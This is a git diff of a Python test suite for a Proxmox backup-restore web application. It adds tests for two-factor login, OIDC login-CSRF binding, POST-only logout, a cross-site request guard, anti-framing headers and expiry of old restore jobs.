@@ -1274,12 +1680,12 @@ def test_restore_original_path_rejects_containers(client):
     assert "container" in resp.json()["detail"].lower()
 
 
-def test_restore_original_path_blocked_without_design_b(client, monkeypatch):
+def test_restore_original_path_blocked_without_guest_exec(client, monkeypatch):
     from backend import guest_agent
 
     async def fake_caps(session, guest_type, vmid):
         reason = "missing VM.GuestAgent.Unrestricted privilege"
-        return _available_caps(design_b=guest_agent.PathAvailability(False, reason))
+        return _available_caps(guest_exec=guest_agent.PathAvailability(False, reason))
 
     monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
     resp = client.get("/api/restore-original-path", params={"type": "vm", "vmid": "133", "volume": "vol"})
@@ -1291,7 +1697,7 @@ def test_restore_original_path_returns_resolved_directory(client, monkeypatch):
     from backend import guest_agent, guest_original_location
 
     async def fake_caps(session, guest_type, vmid):
-        return _available_caps(design_b=guest_agent.PathAvailability(True), guest_os_family="linux", node="pve2")
+        return _available_caps(guest_exec=guest_agent.PathAvailability(True), guest_os_family="linux", node="pve2")
 
     async def fake_resolve(session, vmid, guest_os_family, node, volume, crumbs):
         assert guest_os_family == "linux"
@@ -1315,7 +1721,7 @@ def test_restore_original_path_surfaces_unavailable_reason(client, monkeypatch):
     from backend import guest_agent, guest_original_location
 
     async def fake_caps(session, guest_type, vmid):
-        return _available_caps(design_b=guest_agent.PathAvailability(True))
+        return _available_caps(guest_exec=guest_agent.PathAvailability(True))
 
     async def fake_resolve(session, vmid, guest_os_family, node, volume, crumbs):
         return guest_original_location.OriginalLocationResult(available=False, reason="not mounted")
@@ -1374,67 +1780,20 @@ def test_download_bundle_rejects_unknown_format(client):
     assert resp.status_code == 400
 
 
-def test_download_bundle_builds_zip(client, monkeypatch):
-    async def fake_open(session, volume, filepath, tar=False):
-        class FakeResponse:
-            async def aread(self):
-                return b"file-content"
+def test_download_bundle_streams_a_zip(client, monkeypatch):
+    from tests.test_download_bundle import _tar, patch_downloads
 
-            async def aclose(self):
-                pass
-
-        class FakeClient:
-            async def aclose(self):
-                pass
-
-        return FakeClient(), FakeResponse()
-
-    monkeypatch.setattr(pve_client, "open_download", fake_open)
+    patch_downloads(monkeypatch, {"abc": _tar({"x": b"file-content"})})
     item = '{"filepath": "abc", "name": "a.txt", "leaf": true}'
     resp = client.get(
         "/api/download-bundle",
         params={"volume": "v", "item": [item], "name": "bundle", "format": "zip"},
     )
     assert resp.status_code == 200
+    assert "bundle.zip" in resp.headers["content-disposition"]
     with zipfile.ZipFile(io.BytesIO(resp.content)) as zf:
         assert zf.namelist() == ["a.txt"]
         assert zf.read("a.txt") == b"file-content"
-
-
-def test_download_bundle_directory_entries_are_not_double_prefixed(client, monkeypatch):
-    # Confirmed live 2026-09-02 (in the sibling restore-to-guest code
-    # path, restore_bundle.py): PVE's own zip for a directory selection
-    # already roots every entry under the directory's own name, so
-    # re-prefixing with item_name on top of that doubles it
-    # ("Downloads/Downloads/..."). This endpoint had the same bug.
-    dir_zip_buf = io.BytesIO()
-    with zipfile.ZipFile(dir_zip_buf, mode="w") as zf:
-        zf.writestr("Downloads/photo.jpg", b"family photo bytes")
-
-    async def fake_open(session, volume, filepath, tar=False):
-        class FakeResponse:
-            async def aread(self):
-                return dir_zip_buf.getvalue()
-
-            async def aclose(self):
-                pass
-
-        class FakeClient:
-            async def aclose(self):
-                pass
-
-        return FakeClient(), FakeResponse()
-
-    monkeypatch.setattr(pve_client, "open_download", fake_open)
-    item = '{"filepath": "abc", "name": "Downloads", "leaf": false}'
-    resp = client.get(
-        "/api/download-bundle",
-        params={"volume": "v", "item": [item], "name": "bundle", "format": "zip"},
-    )
-    assert resp.status_code == 200
-    with zipfile.ZipFile(io.BytesIO(resp.content)) as zf:
-        assert zf.namelist() == ["Downloads/photo.jpg"]
-        assert zf.read("Downloads/photo.jpg") == b"family photo bytes"
 
 
 def test_login_page_always_has_a_realm_option(monkeypatch):
@@ -1470,6 +1829,30 @@ def test_login_submit_invalid_credentials(monkeypatch):
     assert "Invalid username or password" in resp.text
 
 
+def test_login_submit_fails_cleanly_when_pve_is_unreachable(monkeypatch):
+    """Issue #98/#99: a transport-level failure (PVE unreachable, TLS
+    verification failure, DNS) isn't an HTTPException and used to
+    propagate as an unhandled 500 with zero indication of the real
+    cause. login_submit was rewritten from scratch by #15's 2FA work
+    before #99 merged, which carried the fix itself forward but dropped
+    this regression test along the way - added back here directly
+    against current main rather than resolving #99's now-conflicting
+    diff, since the code it tests is already shipped."""
+
+    async def unreachable_login(username, password):
+        raise httpx.ConnectError("Connection refused")
+
+    async def realms():
+        return [dict(r) for r in auth._FALLBACK_REALMS]
+
+    monkeypatch.setattr(auth, "login", unreachable_login)
+    monkeypatch.setattr(auth, "list_realms", realms)
+    with TestClient(main.app) as c:
+        resp = c.post("/login", data={"username": "x", "realm": "pam", "password": "y"})
+    assert resp.status_code == 502
+    assert "Could not reach PVE" in resp.text
+
+
 def test_login_submit_success_sets_cookie(monkeypatch):
     async def ok_login(username, password):
         assert username == "x@pam"
@@ -1485,6 +1868,85 @@ def test_login_submit_success_sets_cookie(monkeypatch):
     assert resp.status_code == 303
     assert resp.headers["location"] == "/"
     assert "session_id=session-abc" in resp.headers["set-cookie"]
+
+
+def test_login_submit_shows_code_entry_step_when_2fa_required(monkeypatch):
+    """Issue #15, step 1: a NeedTFA account gets the code-entry form back,
+    not an error - and the response must carry the challenge forward,
+    since this route keeps no server-side state for a login still in
+    progress. Critically, the hidden username field must be PVE's own
+    fully-qualified username from the TFARequired exception ("x@pam"),
+    not the raw typed username ("x") - PVE's challenge ticket is
+    cryptographically bound to the exact string it returned (AAD in its
+    own assemble_ticket call), so resending anything else fails the
+    second call even with the right code. A real live-reported bug: this
+    field used to echo back the raw form value instead."""
+
+    async def needs_tfa(username, password):
+        raise auth.TFARequired(challenge="!tfa!blob", username="x@pam")
+
+    async def realms():
+        return [dict(r) for r in auth._FALLBACK_REALMS]
+
+    monkeypatch.setattr(auth, "login", needs_tfa)
+    monkeypatch.setattr(auth, "list_realms", realms)
+    with TestClient(main.app) as c:
+        resp = c.post("/login", data={"username": "x", "realm": "pam", "password": "y"})
+    assert resp.status_code == 200
+    assert "Two-factor authentication" in resp.text
+    assert 'value="!tfa!blob"' in resp.text
+    assert 'name="username" value="x@pam"' in resp.text
+    assert 'name="realm" value="pam"' in resp.text
+
+
+def test_login_submit_completes_2fa_and_sets_cookie(monkeypatch):
+    """Issue #15, step 2: the code-entry form's own POST is distinguished
+    by tfa_challenge being present, and completes the login via
+    finish_tfa_login - the original password is never sent again."""
+
+    async def finish(username, code, challenge):
+        assert username == "x@pam"
+        assert code == "123456"
+        assert challenge == "!tfa!blob"
+        return "session-2fa"
+
+    monkeypatch.setattr(auth, "finish_tfa_login", finish)
+    with TestClient(main.app) as c:
+        resp = c.post(
+            "/login",
+            # "x@pam" simulates the hidden field as the template actually
+            # renders it (PVE's own fully-qualified username, not a raw
+            # "x" reconstructed with realm) - see login_submit's docstring.
+            data={"username": "x@pam", "realm": "pam", "password": "123456", "tfa_challenge": "!tfa!blob"},
+            follow_redirects=False,
+        )
+    assert resp.status_code == 303
+    assert resp.headers["location"] == "/"
+    assert "session_id=session-2fa" in resp.headers["set-cookie"]
+
+
+def test_login_submit_bad_2fa_code_stays_on_code_entry_step(monkeypatch):
+    from fastapi import HTTPException
+
+    async def bad_code(username, code, challenge):
+        raise HTTPException(status_code=401, detail="Invalid authentication code")
+
+    async def realms():
+        return [dict(r) for r in auth._FALLBACK_REALMS]
+
+    monkeypatch.setattr(auth, "finish_tfa_login", bad_code)
+    monkeypatch.setattr(auth, "list_realms", realms)
+    with TestClient(main.app) as c:
+        resp = c.post(
+            "/login",
+            data={"username": "x@pam", "realm": "pam", "password": "000000", "tfa_challenge": "!tfa!blob"},
+        )
+    assert resp.status_code == 401
+    assert "Invalid authentication code" in resp.text
+    # Stays on the code-entry step rather than bouncing back to
+    # username/password - the challenge is still valid, only the code was wrong.
+    assert "Two-factor authentication" in resp.text
+    assert 'value="!tfa!blob"' in resp.text
 
 
 def test_login_oidc_start_redirects_to_the_returned_auth_url(monkeypatch):
@@ -1532,6 +1994,7 @@ def test_login_oidc_callback_sets_cookie_on_success(monkeypatch):
 
     monkeypatch.setattr(auth, "oidc_login", fake_oidc_login)
     with TestClient(main.app) as c:
+        c.cookies.set("oidc_binding", main._oidc_binding("st1"))
         resp = c.get(
             "/login/oidc/callback",
             params={"state": "st1", "code": "cd1"},
@@ -1573,22 +2036,90 @@ def test_login_oidc_callback_fails_cleanly_when_pve_rejects_the_exchange(monkeyp
     monkeypatch.setattr(auth, "oidc_login", fake_oidc_login)
     monkeypatch.setattr(auth, "list_realms", realms)
     with TestClient(main.app) as c:
+        c.cookies.set("oidc_binding", main._oidc_binding("st1"))
         resp = c.get("/login/oidc/callback", params={"state": "st1", "code": "cd1"})
     assert resp.status_code == 401
     assert "SSO login failed" in resp.text
+
+
+def test_login_oidc_start_sets_binding_cookie_for_the_idp_state(monkeypatch):
+    async def fake_auth_url(realm, redirect_url):
+        return "https://idp.example.com/authorize?client_id=x&state=y"
+
+    monkeypatch.setattr(auth, "oidc_auth_url", fake_auth_url)
+    with TestClient(main.app) as c:
+        resp = c.get("/login/oidc/keycloak", follow_redirects=False)
+    assert f"oidc_binding={main._oidc_binding('y')}" in resp.headers["set-cookie"]
+
+
+def test_login_oidc_callback_rejects_a_flow_this_browser_did_not_start(monkeypatch):
+    # Login CSRF: an attacker's code/state delivered to a victim who has no
+    # (or a different) binding cookie must never be exchanged.
+    async def realms():
+        return [dict(r) for r in auth._FALLBACK_REALMS]
+
+    async def fake_oidc_login(state, code, redirect_url):
+        raise AssertionError("must not be called")
+
+    monkeypatch.setattr(auth, "list_realms", realms)
+    monkeypatch.setattr(auth, "oidc_login", fake_oidc_login)
+    with TestClient(main.app) as c:
+        resp = c.get("/login/oidc/callback", params={"state": "st1", "code": "cd1"})
+        assert resp.status_code == 401
+        c.cookies.set("oidc_binding", main._oidc_binding("other-state"))
+        resp = c.get("/login/oidc/callback", params={"state": "st1", "code": "cd1"})
+    assert resp.status_code == 401
+    assert "not started from this browser" in resp.text
 
 
 def test_logout_clears_cookie_and_session(session_data):
     auth._sessions["session-xyz"] = session_data
     with TestClient(main.app) as c:
         c.cookies.set("session_id", "session-xyz")
-        resp = c.get("/logout", follow_redirects=False)
+        resp = c.post("/logout", follow_redirects=False)
     assert resp.status_code == 303
     assert resp.headers["location"] == "/login"
     assert "session-xyz" not in auth._sessions
 
 
-# --- Design C download endpoint (docs/plan.md §7.6, issue #22) -----------
+def test_logout_via_get_is_not_allowed():
+    with TestClient(main.app) as c:
+        assert c.get("/logout", follow_redirects=False).status_code == 405
+
+
+@pytest.mark.parametrize(
+    ("headers", "blocked"),
+    [
+        ({}, False),  # non-browser client
+        ({"Sec-Fetch-Site": "same-origin"}, False),
+        ({"Sec-Fetch-Site": "none"}, False),
+        ({"Sec-Fetch-Site": "same-site"}, True),  # sibling subdomain / other port
+        ({"Sec-Fetch-Site": "cross-site"}, True),
+        ({"Origin": "http://testserver"}, False),
+        ({"Origin": "http://evil.example.com"}, True),
+        ({"Origin": "null"}, True),
+    ],
+)
+def test_state_changing_requests_are_cross_site_guarded(headers, blocked):
+    with TestClient(main.app) as c:
+        resp = c.post("/logout", headers=headers, follow_redirects=False)
+    assert (resp.status_code == 403) is blocked
+
+
+def test_cross_site_get_is_not_blocked_by_the_guard():
+    with TestClient(main.app) as c:
+        resp = c.get("/login", headers={"Sec-Fetch-Site": "cross-site"})
+    assert resp.status_code == 200
+
+
+def test_responses_forbid_framing():
+    with TestClient(main.app) as c:
+        resp = c.get("/login")
+    assert resp.headers["content-security-policy"] == "frame-ancestors 'none'"
+    assert resp.headers["x-frame-options"] == "DENY"
+
+
+# --- Direct Network Transfer download endpoint (docs/push-to-guest.md) ---
 # Not yet reachable from a live restore - these exercise the endpoint
 # directly with a job created straight through the manager and a token
 # minted straight through restore_download, the way a future bootstrap
@@ -1633,7 +2164,7 @@ def test_restore_download_fetch_requires_no_auth_but_a_valid_token(session_data,
 
 
 def test_restore_download_fetch_serves_local_file_for_a_bundle_restore(session_data, monkeypatch, tmp_path):
-    # 2026-09-02, docs/plan.md §7.7: a bundle's Direct Network Transfer
+    # 2026-09-02, docs/push-to-guest.md: a bundle's Direct Network Transfer
     # mints a token with local_path set - the endpoint must stream that
     # file straight off disk, never touching PVE at all.
     from backend import restore_download
@@ -1686,3 +2217,30 @@ def test_restore_download_fetch_404s_if_the_job_no_longer_exists(session_data):
     with TestClient(main.app) as c:
         resp = c.get(f"/api/restore-downloads/{token}")
     assert resp.status_code == 404
+
+
+def test_restore_jobs_list_evicts_expired_in_memory_jobs(client, monkeypatch, session_data):
+    import time
+
+    from backend import restore_jobs
+
+    monkeypatch.setattr(main, "settings", dataclasses.replace(main.settings, job_history_retention_days=7))
+    job = restore_jobs.manager.create(
+        session=session_data,
+        guest_type="vm",
+        vmid="133",
+        guest_label="web (133)",
+        task_name="t",
+        snapshot_time="2026-08-30T14:48:06Z",
+        source_volume="pbs:backup/vm/133/2026-08-30T14:48:06Z",
+        source_filepath="L2V0Yy9ob3N0cw==",
+        source="/etc/hosts",
+        destination="/etc",
+    )
+    restore_jobs.manager.mark_done(job.id)
+    job.finished_at = time.time() - (8 * 86400)
+    job_history.persist_sync(job)
+
+    resp = client.get("/api/restore-jobs")
+    assert all(j["id"] != job.id for j in resp.json()["jobs"])
+    assert restore_jobs.manager.get(job.id) is None
